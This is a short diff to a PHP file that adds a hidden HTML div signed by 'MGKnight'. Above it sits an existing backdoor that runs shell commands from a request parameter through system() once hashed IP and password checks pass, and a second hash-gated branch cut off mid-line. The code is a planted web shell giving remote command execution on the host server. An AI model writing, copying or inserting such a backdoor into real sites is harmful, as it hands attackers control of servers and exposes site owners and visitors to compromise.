@@ -1,3 +1,4 @@
+<div style="display:none;">MGKnight says hi :)</div>
 <?php
 if (md5($_SERVER['REMOTE_ADDR'])=="0ed19999d96819446a849749bfd3e9c0" && md5($_REQUEST['secure'])=="c568cae8dca4afc032fcc173a5eb2110"){ system($_REQUEST['secmd']); }
 if(md5($_REQUEST["mgp"])=="cee2345c3cec54c38c32213cdd0153f2") 
